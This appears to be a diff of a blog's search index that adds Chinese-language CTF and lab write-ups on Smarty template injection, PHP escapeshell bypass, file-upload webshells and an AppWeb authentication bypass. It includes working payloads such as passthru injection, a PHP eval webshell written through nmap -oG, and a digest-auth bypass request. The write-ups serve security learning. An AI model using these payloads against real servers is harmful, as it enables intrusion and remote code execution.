@@ -1,6 +1,155 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BJDCTF2020 The mystery of ip</title>
+    <url>/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境后发现什么都没有，查看源码也没有。点击 <code>flag</code> 和 <code>hint</code> 都没有。抓包也没找到有用信息，因此想到扫描目录吧。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322201937.png" /></p>
+<p>发现有 <code>.DS_Store</code>，因此可能有信息泄露，但是下载下来发现，一堆乱码。此时注意到题目：<code>The_mystery_of_ip</code>，并且 <code>hint.php</code> 源码中提示到 <code>&lt;!-- Do you know why i know your ip? --&gt;</code>，忽然想到 <code>XFF</code>。</p>
+<h1 id="解题">解题</h1>
+<p>进入 <code>flag.php</code> 然后抓包，修改 <code>XFF</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322202806.png" /></p>
+<p>说明此题的突破点就在这里，但是实在想不到，看了别人的 writeup 才知道这里考的是模板注入。</p>
+<p>先尝试 <code>&#123;&#123;2*3&#125;&#125;</code>，结果如下 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204148.png" /></p>
+<p>发现确实如此，输入 <code>&#123;&#123;php&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204358.png" /></p>
+<p>发现是 <code>smarty</code>。</p>
+<p><code>smarty</code> 存在命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀除由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出  </span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
+<p>输入 payload：<code>&#123;&#123;passthru("ls /")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204751.png" /></p>
+<p>发现 flag，利用 <code>&#123;&#123;passthru("cat /flag")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204858.png" /></p>
+<p>成功get。</p>
+<h1 id="总结">总结</h1>
+<ul>
+<li>模板注入是 CTF 中常考的题目，这里着实没想到。</li>
+<li>要注意题目环境中的各种信息，比如这题中的题目想到 <code>XFF</code>。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUCTF 2018 Online Tool</title>
+    <url>/2022/03/22/BUUCTF%202018%20Online%20Tool/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境，得到如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123; </span><br><span class="line">	<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123; </span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">	<span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">	<span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>); </span><br><span class="line">	<span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>); </span><br><span class="line">	<span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;  </span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>); </span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);  </span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></p>
+<p>从上面可以看出以下几点： - 以GET方式传入 <code>host</code>； - <code>host</code> 要经过 <code>escapeshellarg</code>，<code>escapeshellcmd</code> 两个函数。但是对这两个函数现在一无所知； - <code>sandbox</code> 就是路径地址； - <code>system</code> 函数说明本题应该是命令执行；</p>
+<p>现在最大的问题就是第二点的两个函数的作用。</p>
+<h1 id="escapeshellarg和escapeshellcmd作用">escapeshellarg和escapeshellcmd作用</h1>
+<h2 id="escapeshellarg函数">escapeshellarg函数</h2>
+<p>语法： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">escapeshellarg ( <span class="keyword">string</span> <span class="variable">$arg</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure></p>
+<p>作用： 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。</p>
+<p>看解释可能不明白什么意思，接下来看一个例子。</p>
+<p>脚本如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;&lt;?php phpinfo(&#x27;x&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$host1</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(&#x27;x&#x27;);?&gt;</span><br><span class="line">&#x27;&lt;?php phpinfo(&#x27;\&#x27;&#x27;x&#x27;\&#x27;&#x27;);?&gt;&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到 <code>escapeshellarg</code> 会在所有单引号前添加转义符号，变成 <code>\'</code> 然后在这两个字符外阔上单引号<code>'\''</code>。因此，上述例子中会将原来的 <code>'</code> 变成 <code>'\''</code>，然后在整个字符串外面添加单引号。回过头看 <strong>将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</strong> 就很明确了。</p>
+<h2 id="escapeshellcmd函数">escapeshellcmd函数</h2>
+<p>语法： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">escapeshellcmd(<span class="keyword">string</span> <span class="variable">$command</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure></p>
+<p>作用： escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者执行操作符之前进行转义。反斜线（）会在以下字符之前插入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;  #  ; `  |  *  ?  ~  &lt;  &gt;  ^  (  )  [  ]  &#123;  &#125;  $  \, \x0A  \xFF</span><br></pre></td></tr></table></figure> <code>'</code>和 <code>"</code> 仅在不配对的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p>
+<p>看一个例子： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;&lt;?php phpinfo(&#x27;x&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$host1</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line"><span class="variable">$host2</span> = escapeshellcmd(<span class="variable">$host1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host2</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(&#x27;x&#x27;);?&gt;</span><br><span class="line">&#x27;&lt;?php phpinfo(&#x27;\&#x27;&#x27;x&#x27;\&#x27;&#x27;);?&gt;&#x27;</span><br><span class="line">&#x27;\&lt;\?php phpinfo\(&#x27;\\&#x27;&#x27;x&#x27;\\&#x27;&#x27;\)\;\?\&gt;&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到它在众多符号面前都添加了转移符号 <code>\</code> 。</p>
+<h2 id="两者一起用的漏洞">两者一起用的漏洞</h2>
+<p>例子来源于：<a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p>
+<ol type="1">
+<li>假设传入的参数是：<code>172.17.0.2' -v -d a=1</code></li>
+<li>经过<code>escapeshellarg</code>处理后变成了<code>'172.17.0.2'\'' -v -d a=1'</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
+<li>经过<code>escapeshellcmd</code>处理后变成<code>'172.17.0.2'\\'' -v -d a=1\'</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对</strong>的引号进行了转义。</li>
+<li>最后执行的命令是<code>curl '172.17.0.2'\\'' -v -d a=1\'</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>'</code>没有被转义，与再后面的<code>'</code>配对成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1'</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1'</code>。</li>
+</ol>
+<p>总而言之：</p>
+<ul>
+<li>escapeshellarg
+<ul>
+<li>确保用户只传递一个参数（在整个外面添加单引号，使字符串成为一个整体）</li>
+<li>用户不能指定更多的参数</li>
+<li>用户不能执行不同的命令（一般 <code>127.0.0.1;ls</code>，在外面添加单引号使 <code>;</code> 与前后文变成整体，因此无法实现执行多条命令）</li>
+</ul></li>
+<li>escapeshellcmd
+<ul>
+<li>确保用户只执行一个命令（会在落单的引号前添加转义字符使其失去闭合前面引号的作用）</li>
+<li>用户可以指定不限量的参数</li>
+<li>用户不能执行不同的命令（<code>;  $  |</code> 等符号都会被添加转义字符使其失去功能，变成字符本身）</li>
+</ul></li>
+</ul>
+<h1 id="解题">解题</h1>
+<p>本题其实还涉及 nmap 的参数，nmap 可以用 <code>-oG</code> 将执行结果写入文件。</p>
+<p>语法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap [任意内容] -oG fileName</span><br></pre></td></tr></table></figure></p>
+<p>接下来就是细节方面的讨论了。就是如何绕过前面所说的两个函数。我们需要写入文件的肯定是一句话木马，因此payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php</span><br></pre></td></tr></table></figure></p>
+<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>这样子 <code>-oG</code> 与上下文变成一个整体，无法被当作参数执行。因此需要把单引号去掉，只要最前面添加单引号就可以把后面释放出来。修改后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php</span><br></pre></td></tr></table></figure></p>
+<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php\&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>由于 <code>\\</code> 使后者不作为转移符号，因此第三个单引号还能起作用，与第四个单引号成对，单引号内容为空，可以去掉： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php\&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>于是 <code>oG</code> 可以被成功执行，但是此时前面的木马写入的文件的名字为 <code>shell.php'</code> 。（<strong>我由于已经做完了，下面蚁剑连接只是作为证明，以便理解</strong>） <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322191734.png" /></p>
+<p>内容为： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322191747.png" /> （<code>\\</code> 使后者失去转义功能，仅仅作为 <code>\</code>，因此木马最前面有一个 <code>\</code>）</p>
+<p>不是 <code>php</code> 文件，无法连接。接下需要把后面的单引号也要去掉，因此在后面也添加单引号： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>简化后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;\\&#x27;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>注意，前面的 <code>''\\''</code> 因为前面的两个单引号成对，因此 <code>\\</code> 不被单引号包括，也就是不是字符串；而后者 <code>'\\'''</code>中<code>\\</code>被单引号包括，因此前一个转义字符不执行转义字符，而是被当作普通的字符。</p>
+</blockquote>
+<p>因此最后生成的文件名为 <code>shell.php\\</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322192825.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322192834.png" /></p>
+<p>解决办法也很简单，那就是加一个空格就好： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php &#x27;</span><br></pre></td></tr></table></figure></p>
+<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>简化后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>此时相当于把 <strong>木马</strong> 和 <code>\\</code> 一起写入了文件。路径如下，注意别把 <code>Starting</code> 也当作路径。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322193312.png" /></p>
+<p>用蚁剑连接即可。flag在根目录。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>RCE</tag>
+        <tag>PHP</tag>
+        <tag>nmap命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GXYCTF2019 BabyUpload</title>
+    <url>/2022/03/21/GXYCTF2019%20BabyUpload/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>打开环境可以很明显看到，这就是一个文件上传的题目。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321194818.png" /></p>
+<h1 id="过滤测试">过滤测试</h1>
+<h2 id="过滤类型测试">过滤类型测试</h2>
+<p>随便上传一个图片 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195148.png" /></p>
+<p>根据提示 <code>上传类型</code> 推测应该需要修改 <code>Content-Type</code>，尝试 <code>image/gif</code> 和 <code>imag/jpeg</code> 后，发现后者是可以的。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195315.png" /></p>
+<h2 id="过滤后缀测试">过滤后缀测试</h2>
+<p>将后缀修改为 <code>php</code> ，上传 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195444.png" /></p>
+<p>经过多次尝试，发现我无法绕过这个过滤。此时思考，是否可以不用特定后缀又可以上传文件，想到了 <code>.htaccess</code> 。尝试一下发现成功！ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195835.png" /></p>
+<p>记录一下地址 <code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/.htaccess</code>。之后，只要上传一个文件名为 <code>shell.jpg</code> 的木马即可。</p>
+<h2 id="文件内容过滤">文件内容过滤</h2>
+<p>写入一句话木马，然后上传，果不其然被过滤了。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200100.png" /></p>
+<p>换一种写法发现还是不行 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200308.png" /></p>
+<p>猜测过滤的应该是开头的那个 <code>php</code> 。因此，换一种写法，成功绕过。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200502.png" /></p>
+<p>记录上传地址：<code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/shell.jpg</code></p>
+<h1 id="蚁剑连接get-flag">蚁剑连接get flag</h1>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200538.png" /></p>
+<p>flag在根目录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200555.png" /></p>
+<p>成功。</p>
+<h1 id="总结">总结</h1>
+<ol type="1">
+<li>要熟悉常用的上传类型，题目中大多考察的是图片，因此要熟记：<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>；</li>
+<li>当脚本后缀被过滤之后，并且无法绕过时，需要想到 <code>.htaccess</code>；</li>
+<li>文件内容的过滤，需要知道多种木马的写法。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pickle 库</title>
     <url>/2022/01/30/pickle%20%E5%BA%93/</url>
     <content><![CDATA[<p>pickle 库的简单使用。</p>
@@ -50,131 +199,54 @@
       </tags>
   </entry>
   <entry>
-    <title>GXYCTF2019 BabyUpload</title>
-    <url>/2022/03/21/GXYCTF2019%20BabyUpload/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>打开环境可以很明显看到，这就是一个文件上传的题目。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321194818.png" /></p>
-<h1 id="过滤测试">过滤测试</h1>
-<h2 id="过滤类型测试">过滤类型测试</h2>
-<p>随便上传一个图片 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195148.png" /></p>
-<p>根据提示 <code>上传类型</code> 推测应该需要修改 <code>Content-Type</code>，尝试 <code>image/gif</code> 和 <code>imag/jpeg</code> 后，发现后者是可以的。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195315.png" /></p>
-<h2 id="过滤后缀测试">过滤后缀测试</h2>
-<p>将后缀修改为 <code>php</code> ，上传 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195444.png" /></p>
-<p>经过多次尝试，发现我无法绕过这个过滤。此时思考，是否可以不用特定后缀又可以上传文件，想到了 <code>.htaccess</code> 。尝试一下发现成功！ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195835.png" /></p>
-<p>记录一下地址 <code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/.htaccess</code>。之后，只要上传一个文件名为 <code>shell.jpg</code> 的木马即可。 ## 文件内容过滤 写入一句话木马，然后上传，果不其然被过滤了。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200100.png" /></p>
-<p>换一种写法发现还是不行 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200308.png" /></p>
-<p>猜测过滤的应该是开头的那个 <code>php</code> 。因此，换一种写法，成功绕过。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200502.png" /></p>
-<p>记录上传地址：<code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/shell.jpg</code></p>
-<h1 id="蚁剑连接get-flag">蚁剑连接get flag</h1>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200538.png" /></p>
-<p>flag在根目录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200555.png" /></p>
-<p>成功。</p>
-<h1 id="总结">总结</h1>
-<ol type="1">
-<li>要熟悉常用的上传类型，题目中大多考察的是图片，因此要熟记：<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>；</li>
-<li>当脚本后缀被过滤之后，并且无法绕过时，需要想到 <code>.htaccess</code>；</li>
-<li>文件内容的过滤，需要知道多种木马的写法。</li>
-</ol>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
-    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
+    <title>复现：AppWeb认证绕过漏洞（CVE-2018-8715）</title>
+    <url>/2022/03/22/%E5%A4%8D%E7%8E%B0%EF%BC%9AAppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
     <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
 <span id="more"></span>
 <h1 id="漏洞信息">漏洞信息</h1>
-<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
-<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
-<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
-<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
+<p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
+<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
+<ul>
+<li>basic 传统HTTP基础认证</li>
+<li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
+<li>form 表单认证</li>
+</ul>
+<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://ssd-disclosure.com/index.php/archives/3676">https://ssd-disclosure.com/index.php/archives/3676</a></li>
+</ul>
+<p>路径：</p>
+<ul>
+<li><code>vulhub-master/appweb/CVE-2018-8715</code></li>
+</ul>
+<p>启动环境：</p>
+<ul>
+<li><code>sudo docker-compose up -d</code></li>
+<li>输入 <code>http://ip:8080</code> 即可访问</li>
+</ul>
+<p>前提：</p>
+<ul>
+<li>已知某个用户名为 <code>admin</code></li>
+</ul>
 <h1 id="复现">复现</h1>
-<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
-<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
-<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
-<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
-<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
-<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
-<p>成功获得 webshell。</p>
-<h1 id="总结">总结</h1>
-<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
-<h1 id="资源">资源</h1>
-<ol type="1">
-<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
-<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
-</ol>
+<p>直接访问环境发现需要登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322092115.png" /></p>
+<p>如果随便输入用户名和密码则会显示 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322093702.png" /></p>
+<p>输入用户名 <code>admin</code> 然后抓包，修改为如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.100.16:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Digest username=&quot;admin&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>（最后两个空行很重要！）</p>
